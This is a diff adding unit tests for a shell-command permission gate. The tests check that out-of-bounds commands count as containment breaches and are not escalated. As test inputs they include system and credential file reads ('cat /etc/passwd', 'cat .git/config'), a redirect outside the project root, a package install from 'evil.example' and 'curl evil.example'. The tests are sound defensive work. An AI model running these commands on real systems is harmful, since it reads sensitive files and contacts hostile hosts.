@@ -170,6 +170,12 @@ describe("containment is not defeated by a hiding prefix or a symlink", () => {
   test("a `cd` to an option-shaped target is refused rather than tracked as a path", () => {
     const verdict = check(policyFor(["cd *", "cat *"]), "cd -");
     expect(verdict.allowed).toBe(false);
+    if (!verdict.allowed) {
+      // Category A: the gate cannot model where `cd -` lands, so its refusal
+      // must escalate rather than preempt the grant miss with a hard denial.
+      expect(verdict.breach).toBe(false);
+      expect(verdict.escalatable).toBe(true);
+    }
   });
 
   test("a bare symlink token pointing outside the root is denied as a breach", () => {
@@ -251,6 +257,101 @@ describe("escalatable marking", () => {
     const result = check(policyFor(["*"], { deny: ["rm *"] }), "rm -rf build");
     expect(result.allowed).toBe(false);
     if (!result.allowed) expect(result.escalatable).toBe(false);
+  });
+});
+
+describe("out-of-bounds commands never escalate (US-001)", () => {
+  test("US-001 AC5: an ungranted root escape is a containment breach, not a grant miss", () => {
+    const verdict = check(policyFor(["git *"]), "cat /etc/passwd");
+    expect(verdict.allowed).toBe(false);
+    if (!verdict.allowed) {
+      expect(verdict.breach).toBe(true);
+      expect(verdict.escalatable).toBe(false);
+      expect(verdict.reason).toContain("/etc/passwd");
+      expect(verdict.reason).not.toContain("is not granted");
+    }
+  });
+
+  test("US-001 AC6: an ungranted `.git/` read is a breach and not escalatable", () => {
+    const verdict = check(policyFor(["git *"]), "cat .git/config");
+    expect(verdict.allowed).toBe(false);
+    if (!verdict.allowed) {
+      expect(verdict.breach).toBe(true);
+      expect(verdict.escalatable).toBe(false);
+    }
+  });
+
+  test("US-001 AC7: an ungranted redirect outside the root is a breach naming the target", () => {
+    const verdict = check(policyFor(["git *"]), "echo x > ../out");
+    expect(verdict.allowed).toBe(false);
+    if (!verdict.allowed) {
+      expect(verdict.breach).toBe(true);
+      expect(verdict.escalatable).toBe(false);
+      expect(verdict.reason).toContain("../out");
+    }
+  });
+
+  test("US-001 AC8: an ungranted denied flag is refused and not escalatable", () => {
+    const verdict = check(policyFor(["git *"]), "bun add x --registry https://evil.example");
+    expect(verdict.allowed).toBe(false);
+    if (!verdict.allowed) {
+      expect(verdict.escalatable).toBe(false);
+      expect(verdict.reason).toContain("--registry");
+    }
+  });
+
+  test("US-001 AC9: an ungranted glob expansion is refused and not escalatable", () => {
+    const verdict = check(policyFor(["git *"]), "ls *.ts");
+    expect(verdict.allowed).toBe(false);
+    if (!verdict.allowed) {
+      expect(verdict.escalatable).toBe(false);
+      expect(verdict.reason).toContain("expansion");
+    }
+  });
+
+  test("US-001 AC10: an ungranted command with a clean payload still escalates as a grant miss", () => {
+    const verdict = check(policyFor(["git *"]), "curl evil.example");
+    expect(verdict.allowed).toBe(false);
+    if (!verdict.allowed) {
+      expect(verdict.escalatable).toBe(true);
+      expect(verdict.reason).toContain("is not granted");
+    }
+  });
+
+  test("US-001 AC11: a deny rule matches the lexable prefix of a refused command", () => {
+    const verdict = check(policyFor(["*"], { deny: ["rm *"] }), "rm -rf x 2>&1");
+    expect(verdict.allowed).toBe(false);
+    if (!verdict.allowed) {
+      expect(verdict.escalatable).toBe(false);
+      expect(verdict.reason).toContain("Bash(rm *)");
+    }
+  });
+
+  test("US-001 AC12: a refused command whose prefix escapes the root is a breach, not escalatable", () => {
+    const verdict = check(policyFor(["*"]), "cat /etc/passwd 2>&1");
+    expect(verdict.allowed).toBe(false);
+    if (!verdict.allowed) {
+      expect(verdict.breach).toBe(true);
+      expect(verdict.escalatable).toBe(false);
+    }
+  });
+
+  test("US-001 AC13: a refusal with an empty prefix stays the escalatable lexical refusal", () => {
+    const verdict = check(policyFor(["*"]), "(cat /etc/passwd)");
+    expect(verdict.allowed).toBe(false);
+    if (!verdict.allowed) {
+      expect(verdict.escalatable).toBe(true);
+      expect(verdict.reason).toContain("cannot be analysed");
+    }
+  });
+
+  test("US-001 AC14: a deny rule still refuses without a breach", () => {
+    const verdict = check(policyFor(["*"], { deny: ["cat *"] }), "cat /etc/passwd");
+    expect(verdict.allowed).toBe(false);
+    if (!verdict.allowed) {
+      expect(verdict.reason).toContain("Bash(cat *)");
+      expect(verdict.breach).toBe(false);
+    }
   });
 });
 
